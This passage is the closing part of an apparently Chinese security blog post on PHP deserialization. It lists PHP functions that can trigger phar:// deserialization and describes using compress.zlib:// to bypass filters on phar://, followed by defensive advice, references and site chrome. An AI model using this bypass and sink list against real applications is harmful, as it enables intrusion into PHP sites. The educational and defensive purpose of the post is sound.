+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fopen%20%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fopen%20%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0.png" alt="此处输入图片的描述"></a></p>
+<p>是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索</p>
+<h4 id="4-举一反三"><a href="#4-举一反三" class="headerlink" title="(4)举一反三"></a><strong>(4)举一反三</strong></h4><p>我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20%E6%BA%90%E7%A0%81%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20%E6%BA%90%E7%A0%81%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" alt="此处输入图片的描述"></a></p>
+<p>而这些截图只是整个影响面的冰山一角</p>
+<h4 id="5-收集整理"><a href="#5-收集整理" class="headerlink" title="(5)收集整理"></a><strong>(5)收集整理</strong></h4><h5 id="1-hash"><a href="#1-hash" class="headerlink" title="1.hash"></a><strong>1.hash</strong></h5><p><a href="https://github.com/php/php-src/blob/master/ext/hash/hash.c#L263" target="_blank" rel="noopener">(1)hash_file()</a><br><a href="https://github.com/php/php-src/blob/master/ext/hash/hash.c#L494" target="_blank" rel="noopener">(2)hash_update_file()</a></p>
+<h5 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2.MySQL"></a><strong>2.MySQL</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlnd_local_infile_init</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysqlnd.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysqlnd.png" alt="此处输入图片的描述"></a></p>
+<h5 id="3-file"><a href="#3-file" class="headerlink" title="3.file"></a><strong>3.file</strong></h5><p>这里只是对 file 的补充</p>
+<p><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L1401" target="_blank" rel="noopener">(1)readfile()</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/filestat.c#L675" target="_blank" rel="noopener">(2)touch</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L400" target="_blank" rel="noopener">(3)get_meta_tags()</a><br><a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L758" target="_blank" rel="noopener">(4)file()</a></p>
+<h5 id="4-PDO-postgresql"><a href="#4-PDO-postgresql" class="headerlink" title="4.PDO::postgresql"></a><strong>4.PDO::postgresql</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PDO::pgsqlCopyFromFile(string $table_name , string $filename [, string $delimiter [, string $null_as ] [, string $fields])</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-URL"><a href="#5-URL" class="headerlink" title="5.URL"></a><strong>5.URL</strong></h5><p>fetches all the headers sent by the server in response to a HTTP request</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_headers(string url[, int format[, resource context]])</span><br></pre></td></tr></table></figure>
+
+<h5 id="6-zlib"><a href="#6-zlib" class="headerlink" title="6.zlib"></a><strong>6.zlib</strong></h5><p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib.png" alt="此处输入图片的描述"></a></p>
+<h5 id="7-libxml"><a href="#7-libxml" class="headerlink" title="7.libxml"></a><strong>7.libxml</strong></h5><p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/libxml.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/libxml.png" alt="此处输入图片的描述"></a></p>
+<h5 id="8-fileinfo"><a href="#8-fileinfo" class="headerlink" title="8.fileinfo"></a><strong>8.fileinfo</strong></h5><p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fileinfo.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fileinfo.png" alt="此处输入图片的描述"></a></p>
+<p>这些只是我找到的一些，还有一些在 <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p>
+<h4 id="6-简单测试"><a href="#6-简单测试" class="headerlink" title="(6)简单测试"></a><strong>(6)简单测试</strong></h4><p>这里我就挑选最最有趣的做一个测试</p>
+<p>zlib 这个非常有意思，他的实现意味着我们能在 compress.zlib:// 后面添加我们的 phar 语句，也就是说如果禁止了开头使用 phar:// 我们就能用这种方法绕过</p>
+<p><strong>测试代码：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%811.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%811.png" alt="此处输入图片的描述"></a></p>
+<p><strong>结果如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%20%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%20%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></a></p>
+<p>当然，这些还远远不够，在<a href="https://files.ripstech.com/slides/PHP.RUHR_2018_New_PHP_Exploitation_Techniques.pdf" target="_blank" rel="noopener">这片文章</a>中列举了非常多与之有关的函数</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another1.png" alt="此处输入图片的描述"></a></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another2.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another2.png" alt="此处输入图片的描述"></a></p>
+<p>除此之外就是 zsx 师傅<a href="https://xz.aliyun.com/t/2958#toc-9" target="_blank" rel="noopener">找到的</a>，我没有仔细看重合的部分，读者想发觉自己看一下吧</p>
+<h2 id="0X07-防御方法："><a href="#0X07-防御方法：" class="headerlink" title="0X07 防御方法："></a><strong>0X07 防御方法：</strong></h2><p>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能<br>2.在文件系统函数的参数可控时，对参数进行严格的过滤。<br>3.严格检查上传文件的内容，而不是只检查文件头。<br>4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</p>
+<h2 id="0X08-总结"><a href="#0X08-总结" class="headerlink" title="0X08 总结"></a><strong>0X08 总结</strong></h2><p>本文结合我对 PHP 反序列化的理解以及参考文章的分析，详细地一步一个脚印地分析了 什么是PHP 反序列化，PHP 反序列化有什么意义, 攻击者是如何利用 PHP 反序列化的漏洞进行攻击的，并详细分析了通用的攻击思路与攻击手段，对 Phar 对 PHP 反序列化的扩展也做了详细的讨论，特别是补充的从底层分析漏洞来源并扩展攻击面很值得我们思考(感谢ZSX 大佬的分享，利用这个知识点我也出了 LCTF 2018 的一道 web 题，我从中也学到了很多，当然由于水平有限，这一部分分析可能不到位，请大家见谅)，我还在在最后给出了简单的防御 PHP 反序列化的几条建议，希望读者在看完我的文章以后有与众不同的的收获，这将是我莫大的荣幸。</p>
+<h2 id="0X08-参考"><a href="#0X08-参考" class="headerlink" title="0X08 参考"></a><strong>0X08 参考</strong></h2><p><a href="http://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167721.html</a><br><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br><a href="http://paper.tuisec.win/detail/fa497a4e50b5d83" target="_blank" rel="noopener">http://paper.tuisec.win/detail/fa497a4e50b5d83</a><br><a href="http://www.blogsir.com.cn/safe/452.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/452.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener">https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/</a><br><a href="http://www.freebuf.com/column/161798.html" target="_blank" rel="noopener">http://www.freebuf.com/column/161798.html</a><br><a href="https://www.anquanke.com/post/id/84922" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84922</a><br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a><br><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">http://www.venenof.com/index.php/archives/565/</a><br><a href="http://www.blogsir.com.cn/safe/452.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/452.html</a><br><a href="http://www.laruence.com/2010/06/20/1602.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/20/1602.html</a><br><a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a><br><a href="https://laravelacademy.org/post/7459.html" target="_blank" rel="noopener">https://laravelacademy.org/post/7459.html</a><br><a href="https://blog.csdn.net/tuantuanls/article/details/28445877?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">https://blog.csdn.net/tuantuanls/article/details/28445877?utm_source=itdadao&amp;utm_medium=referral</a><br><a href="http://www.php.net/manual/en/book.stream.php" target="_blank" rel="noopener">http://www.php.net/manual/en/book.stream.php</a><br><a href="https://blog.csdn.net/gb4215287/article/details/78134445" target="_blank" rel="noopener">https://blog.csdn.net/gb4215287/article/details/78134445</a></p>
+<p>转自：</p>
+<p><a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 反序列化漏洞/" title="一篇文章带你深入理解漏洞之 PHP 反序列化漏洞">https://wh0ale.github.io/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 反序列化漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i># php</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/03/2019-1-3-BypassWaf_webshell/" rel="next" title="BypassWaf_webshell">
+                <i class="fa fa-chevron-left"></i> BypassWaf_webshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 文件包含漏洞/" rel="prev" title="一篇文章带你理解漏洞之 PHP 文件包含漏洞">
+                一篇文章带你理解漏洞之 PHP 文件包含漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X00-前言"><span class="nav-number">1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-什么是序列化和反序列化"><span class="nav-number">2.</span> <span class="nav-text">0X01 什么是序列化和反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-从-json-开始类比"><span class="nav-number">2.1.</span> <span class="nav-text">1.从 json 开始类比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-PHP-的序列化"><span class="nav-number">2.2.</span> <span class="nav-text">2.PHP 的序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-PHP-的反序列化"><span class="nav-number">2.3.</span> <span class="nav-text">3.PHP 的反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X02-为什么要-PHP-的序列化和反序列化"><span class="nav-number">3.</span> <span class="nav-text">0X02 为什么要 PHP 的序列化和反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X03-PHP-反序列化漏洞"><span class="nav-number">4.</span> <span class="nav-text">0X03 PHP 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-概念解释："><span class="nav-number">4.1.</span> <span class="nav-text">1.概念解释：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-必须知道的魔法方法："><span class="nav-number">4.2.</span> <span class="nav-text">2.必须知道的魔法方法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-为什么要提到这些魔法方法"><span class="nav-number">4.3.</span> <span class="nav-text">3.为什么要提到这些魔法方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-调用魔法方法的例子"><span class="nav-number">4.4.</span> <span class="nav-text">4.调用魔法方法的例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-利用魔法方法发起攻击"><span class="nav-number">4.5.</span> <span class="nav-text">5.利用魔法方法发起攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X04-POP-链的介绍"><span class="nav-number">5.</span> <span class="nav-text">0X04 POP 链的介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-POP-链实战"><span class="nav-number">5.1.</span> <span class="nav-text">1.POP 链实战</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X05-利用-phar-拓展-PHP-反序列化的攻击面"><span class="nav-number">6.</span> <span class="nav-text">0X05 利用 phar:// 拓展 PHP 反序列化的攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-回顾一下原先-PHP-反序列化攻击的必要条件"><span class="nav-number">6.1.</span> <span class="nav-text">1.回顾一下原先 PHP 反序列化攻击的必要条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-phar-如何扩展反序列化的攻击面的"><span class="nav-number">6.2.</span> <span class="nav-text">2.phar:// 如何扩展反序列化的攻击面的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-具体解释一下-phar-的使用"><span class="nav-number">6.3.</span> <span class="nav-text">3.具体解释一下 phar 的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Phar-的文件结构"><span class="nav-number">6.3.1.</span> <span class="nav-text">1.Phar 的文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-如何创建一个合法的-Phar压缩文件"><span class="nav-number">6.3.2.</span> <span class="nav-text">2.如何创建一个合法的 Phar压缩文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-phar-反序列化小实验"><span class="nav-number">6.3.3.</span> <span class="nav-text">3.phar 反序列化小实验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-phar-的实战"><span class="nav-number">6.3.4.</span> <span class="nav-text">4.phar 的实战</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-自己搭建靶场"><span class="nav-number">6.3.5.</span> <span class="nav-text">5.自己搭建靶场</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X06-从-PHP-源码探索-phar-利用成功的深层原因"><span class="nav-number">7.</span> <span class="nav-text">0X06 从 PHP 源码探索 phar 利用成功的深层原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-先介绍-PHP-流的概念"><span class="nav-number">7.1.</span> <span class="nav-text">1.先介绍 PHP 流的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-介绍流封装协议（wrapper）："><span class="nav-number">7.2.</span> <span class="nav-text">2.介绍流封装协议（wrapper）：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#http-流封装协议"><span class="nav-number">7.2.1.</span> <span class="nav-text">http://流封装协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-流封装协议"><span class="nav-number">7.2.2.</span> <span class="nav-text">file://流封装协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#还有更多"><span class="nav-number">7.2.3.</span> <span class="nav-text">还有更多</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-开始向下挖掘："><span class="nav-number">7.3.</span> <span class="nav-text">3.开始向下挖掘：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-先看一下-Phar-文件源代码部分"><span class="nav-number">7.3.1.</span> <span class="nav-text">(1)先看一下 Phar 文件源代码部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-但是这个函数为什么能调用呢"><span class="nav-number">7.3.2.</span> <span class="nav-text">(2)但是这个函数为什么能调用呢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-由此及彼"><span class="nav-number">7.3.3.</span> <span class="nav-text">(3)由此及彼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-举一反三"><span class="nav-number">7.3.4.</span> <span class="nav-text">(4)举一反三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-收集整理"><span class="nav-number">7.3.5.</span> <span class="nav-text">(5)收集整理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-hash"><span class="nav-number">7.3.5.1.</span> <span class="nav-text">1.hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-MySQL"><span class="nav-number">7.3.5.2.</span> <span class="nav-text">2.MySQL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-file"><span class="nav-number">7.3.5.3.</span> <span class="nav-text">3.file</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-PDO-postgresql"><span class="nav-number">7.3.5.4.</span> <span class="nav-text">4.PDO::postgresql</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-URL"><span class="nav-number">7.3.5.5.</span> <span class="nav-text">5.URL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-zlib"><span class="nav-number">7.3.5.6.</span> <span class="nav-text">6.zlib</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-libxml"><span class="nav-number">7.3.5.7.</span> <span class="nav-text">7.libxml</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-fileinfo"><span class="nav-number">7.3.5.8.</span> <span class="nav-text">8.fileinfo</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-简单测试"><span class="nav-number">7.3.6.</span> <span class="nav-text">(6)简单测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X07-防御方法："><span class="nav-number">8.</span> <span class="nav-text">0X07 防御方法：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X08-总结"><span class="nav-number">9.</span> <span class="nav-text">0X08 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X08-参考"><span class="nav-number">10.</span> <span class="nav-text">0X08 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
